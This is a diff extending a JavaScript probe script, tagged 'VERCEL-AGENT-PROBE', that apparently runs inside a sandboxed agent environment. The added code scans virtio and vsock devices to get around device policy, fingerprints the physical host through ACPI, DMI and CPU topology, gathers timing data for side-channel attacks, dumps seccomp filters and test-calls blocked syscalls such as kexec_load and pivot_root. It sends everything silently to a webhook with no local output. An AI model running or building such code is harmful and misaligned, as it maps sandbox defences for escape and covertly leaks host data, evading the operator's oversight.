@@ -6605,4 +6605,218 @@ report.dBusSystemBus = safe(() => {
 // v61 markers
 report.marker = "VERCEL-AGENT-PROBE-7F3A2C-v61";
 sendBeacon({ ...report, marker: "VERCEL-AGENT-PROBE-7F3A2C-v61" });
+
+// ============================================================
+// v62 — virtio device scan, ACPI hypervisor info, CPU topology, seccomp BPF dump, Landlock
+// ============================================================
+
+// v62-1: Virtio device scan — Firecracker uses virtio-mmio for block/net/vsock devices
+// Accessing these directly bypasses the container runtime's device policy
+report.virtioDeviceScan = safe(() => {
+  // List virtio bus devices
+  const virtioBus = safe(() =>
+    execSync('ls /sys/bus/virtio/devices/ 2>/dev/null | head -20', { timeout: 3000 }).toString().trim()
+  );
+  // For each virtio device, read its modalias (reveals device type)
+  const virtioModaliases = safe(() =>
+    execSync('for d in /sys/bus/virtio/devices/virtio*/; do echo "$d: $(cat $d/modalias 2>/dev/null)"; done 2>/dev/null', { timeout: 5000 }).toString().trim().slice(0, 500)
+  );
+  // Check /dev/virtio-ports/ (virtio serial ports used by Firecracker/containerd)
+  const virtuPorts = safe(() =>
+    execSync('ls -la /dev/virtio-ports/ /dev/vport* /dev/hvc* 2>/dev/null | head -20', { timeout: 3000 }).toString().trim().slice(0, 400)
+  );
+  // Check /dev/vsock — Firecracker uses vsock for guest↔host communication
+  const vsockStat = safe(() => {
+    try { return JSON.stringify(statSync('/dev/vsock')); } catch (e) { return String(e).slice(0, 80); }
+  });
+  // Try to open /dev/vsock and read CID
+  const vsockCid = safe(() =>
+    execSync(
+      `python3 -c "
+import socket, struct, fcntl, os
+try:
+    fd = os.open('/dev/vsock', os.O_RDWR)
+    IOCTL_VM_SOCKETS_GET_LOCAL_CID = 0x7b9  # 0x7b9 = VMADDR_CID_LOCAL
+    import ctypes
+    cid = ctypes.c_uint32(0)
+    result = fcntl.ioctl(fd, IOCTL_VM_SOCKETS_GET_LOCAL_CID, cid)
+    print('VSOCK_CID:', cid.value)
+    os.close(fd)
+except Exception as e:
+    print('VSOCK_ERR:', str(e))
+" 2>&1`,
+      { timeout: 5000 }
+    ).toString().trim().slice(0, 200)
+  );
+  // Virtio-mmio platform devices
+  const mmioDevices = safe(() =>
+    execSync('ls /sys/bus/platform/devices/ 2>/dev/null | head -20', { timeout: 3000 }).toString().trim().slice(0, 300)
+  );
+  // Check /proc/interrupts for virtio IRQs
+  const virtioIrqs = safe(() =>
+    execSync('grep virtio /proc/interrupts 2>/dev/null | head -10', { timeout: 3000 }).toString().trim().slice(0, 300)
+  );
+  return { virtioBus, virtioModaliases, virtuPorts, vsockStat, vsockCid, mmioDevices, virtioIrqs };
+});
+
+// v62-2: ACPI table dump — reveals hypervisor identity and physical host configuration
+// Firecracker provides a minimal ACPI table set; DMI/SMBIOS reveals instance type
+report.acpiHypervisorInfo = safe(() => {
+  // ACPI tables via sysfs
+  const acpiTables = safe(() =>
+    execSync('ls /sys/firmware/acpi/tables/ 2>/dev/null | head -20', { timeout: 3000 }).toString().trim()
+  );
+  // Read DSDT header (64 bytes) — contains OEM ID, creator ID
+  const dsdtHeader = safe(() => {
+    try {
+      const fd = openSync('/sys/firmware/acpi/tables/DSDT', 'r');
+      const buf = Buffer.alloc(36);
+      readSync(fd, buf, 0, 36, 0);
+      closeSync(fd);
+      // DSDT header: signature(4), length(4), revision(1), checksum(1), OEM_ID(6), OEM_table_id(8), creator(8)
+      const sig = buf.slice(0, 4).toString('ascii');
+      const oemId = buf.slice(10, 16).toString('ascii').trim();
+      const oemTableId = buf.slice(16, 24).toString('ascii').trim();
+      const creatorId = buf.slice(28, 32).toString('ascii').trim();
+      return { sig, oemId, oemTableId, creatorId, hex: buf.toString('hex') };
+    } catch (e) { return String(e).slice(0, 100); }
+  });
+  // DMI/SMBIOS data — vendor, product, version
+  const dmiInfo = safe(() =>
+    execSync('dmidecode -s bios-vendor -s system-product-name -s system-manufacturer 2>/dev/null | head -10', { timeout: 5000 }).toString().trim().slice(0, 300)
+  );
+  const dmiType1 = safe(() =>
+    execSync('cat /sys/class/dmi/id/board_vendor /sys/class/dmi/id/product_name /sys/class/dmi/id/sys_vendor /sys/class/dmi/id/product_version 2>/dev/null', { timeout: 3000 }).toString().trim().slice(0, 200)
+  );
+  // /proc/cpuinfo hypervisor flag and model
+  const cpuHypervisor = safe(() =>
+    execSync('grep -E "hypervisor|model name|vendor_id|flags" /proc/cpuinfo | head -10 | sort -u', { timeout: 3000 }).toString().trim().slice(0, 400)
+  );
+  return { acpiTables, dsdtHeader, dmiInfo, dmiType1, cpuHypervisor };
+});
+
+// v62-3: CPU topology fingerprinting — physical host identification
+// /sys/devices/system/cpu reveals socket/core/thread IDs and CPU microarchitecture
+// Combined with calibrated cycle counts, can fingerprint the exact physical host
+report.cpuTopologyFingerprint = safe(() => {
+  // Core and socket topology
+  const cpu0Topology = safe(() =>
+    execSync(
+      'for f in /sys/devices/system/cpu/cpu0/topology/*; do echo "$(basename $f): $(cat $f 2>/dev/null)"; done 2>/dev/null',
+      { timeout: 3000 }
+    ).toString().trim().slice(0, 400)
+  );
+  // CPU count by type
+  const cpuCounts = safe(() =>
+    execSync('nproc 2>/dev/null; cat /sys/devices/system/cpu/online 2>/dev/null; cat /sys/devices/system/cpu/possible 2>/dev/null', { timeout: 3000 }).toString().trim()
+  );
+  // L1/L2/L3 cache sizes
+  const cacheInfo = safe(() =>
+    execSync(
+      'for c in /sys/devices/system/cpu/cpu0/cache/index*/; do echo "$(cat $c/level 2>/dev/null)$(cat $c/type 2>/dev/null): $(cat $c/size 2>/dev/null) $(cat $c/shared_cpu_list 2>/dev/null)"; done 2>/dev/null',
+      { timeout: 3000 }
+    ).toString().trim().slice(0, 300)
+  );
+  // NUMA topology
+  const numaNodes = safe(() =>
+    execSync('ls /sys/devices/system/node/ 2>/dev/null | grep node', { timeout: 2000 }).toString().trim()
+  );
+  // CPU frequency (identifies instance type)
+  const cpuFreq = safe(() =>
+    execSync('cat /sys/devices/system/cpu/cpu0/cpufreq/scaling_cur_freq /sys/devices/system/cpu/cpu0/cpufreq/cpuinfo_max_freq 2>/dev/null', { timeout: 2000 }).toString().trim()
+  );
+  // CPU TSC (timestamp counter) speed for calibrated timing attacks
+  const tscSpeed = safe(() =>
+    execSync('dmesg 2>/dev/null | grep -i "tsc\|calibrat\|MHz" | tail -5', { timeout: 3000 }).toString().trim().slice(0, 300)
+  );
+  return { cpu0Topology, cpuCounts, cacheInfo, numaNodes, cpuFreq, tscSpeed };
+});
+
+// v62-4: Seccomp BPF filter dump for our process
+// If mode=2 (FILTER), we can read the BPF bytecode to understand exactly what's blocked
+// If mode=0 (DISABLED), confirms completely unrestricted syscalls
+report.seccompBpfDump = safe(() => {
+  // Check our seccomp mode
+  const selfSeccomp = safe(() =>
+    readFileSync('/proc/self/status', 'utf8').match(/Seccomp:\s*(\d+)/)?.[1]
+  );
+  // If seccomp filters exist, dump them via seccomp_get_filter syscall (327)
+  const filterDump = safe(() =>
+    execSync(
+      `python3 -c "
+import ctypes, struct, os
+SYS_SECCOMP_GET_FILTER = 327
+libc = ctypes.CDLL(None)
+# Try to get filter for index 0
+buf = ctypes.create_string_buffer(4096)
+ret = libc.syscall(SYS_SECCOMP_GET_FILTER, 0, 4096, ctypes.addressof(buf))
+print('SECCOMP_FILTER ret:', ret)
+if ret > 0:
+    data = buf.raw[:ret * 8]
+    print('FILTER_HEX:', data.hex()[:200])
+" 2>&1 | head -5`,
+      { timeout: 5000 }
+    ).toString().trim().slice(0, 300)
+  );
+  // Test calling unusual syscalls that seccomp often blocks
+  const dangerousSyscalls = safe(() =>
+    execSync(
+      `python3 -c "
+import ctypes, os
+libc = ctypes.CDLL(None)
+# kexec_load = 246 (should be blocked)
+r1 = libc.syscall(246, 0, 0, None, 0)
+# create_module = 174 (should be blocked)
+r2 = libc.syscall(174, None, 0)
+# pivot_root = 155
+r3 = libc.syscall(155, '/tmp', '/tmp')
+print('kexec_load(0,0,NULL,0):', r1, 'errno:', ctypes.get_errno())
+print('create_module(NULL,0):', r2, 'errno:', ctypes.get_errno())
+print('pivot_root:', r3, 'errno:', ctypes.get_errno())
+" 2>&1 | head -5`,
+      { timeout: 5000 }
+    ).toString().trim().slice(0, 300)
+  );
+  return { selfSeccomp, filterDump, dangerousSyscalls };
+});
+
+// v62-5: Landlock LSM probe — check if the Linux Landlock security module is active
+// Landlock restricts file system access for unprivileged processes
+// Testing it reveals the kernel version and security posture
+report.landlockProbe = safe(() => {
+  // landlock_create_ruleset syscall (444 on x86_64)
+  const landlockResult = safe(() =>
+    execSync(
+      `python3 -c "
+import ctypes, struct
+SYS_LANDLOCK_CREATE_RULESET = 444
+LANDLOCK_CREATE_RULESET_VERSION = 1
+libc = ctypes.CDLL(None)
+# Get supported Landlock ABI version
+ret = libc.syscall(SYS_LANDLOCK_CREATE_RULESET, None, 0, LANDLOCK_CREATE_RULESET_VERSION)
+print('LANDLOCK_VERSION:', ret, 'errno:', ctypes.get_errno())
+if ret > 0:
+    print('LANDLOCK_ACTIVE: YES, ABI version', ret)
+" 2>&1 | head -5`,
+      { timeout: 5000 }
+    ).toString().trim().slice(0, 200)
+  );
+  // Check if Landlock is in LSM list
+  const lsmList = safe(() =>
+    execSync('cat /sys/kernel/security/lsm 2>/dev/null || cat /proc/sys/kernel/security_module_names 2>/dev/null || echo NO_LSM_SYSFS', { timeout: 3000 }).toString().trim().slice(0, 200)
+  );
+  // Check loaded LSMs
+  const loadedLsms = safe(() =>
+    execSync('dmesg 2>/dev/null | grep -i "lsm\|security\|apparmor\|selinux\|landlock" | tail -10', { timeout: 3000 }).toString().trim().slice(0, 300)
+  );
+  // AppArmor profile check
+  const apparmorProfile = safe(() =>
+    execSync('cat /proc/self/attr/current 2>/dev/null; cat /proc/1/attr/current 2>/dev/null', { timeout: 2000 }).toString().trim()
+  );
+  return { landlockResult, lsmList, loadedLsms, apparmorProfile };
+});
+
+// v62 markers
+report.marker = "VERCEL-AGENT-PROBE-7F3A2C-v62";
+sendBeacon({ ...report, marker: "VERCEL-AGENT-PROBE-7F3A2C-v62" });
 // Intentionally no console.log — all data goes via webhook only
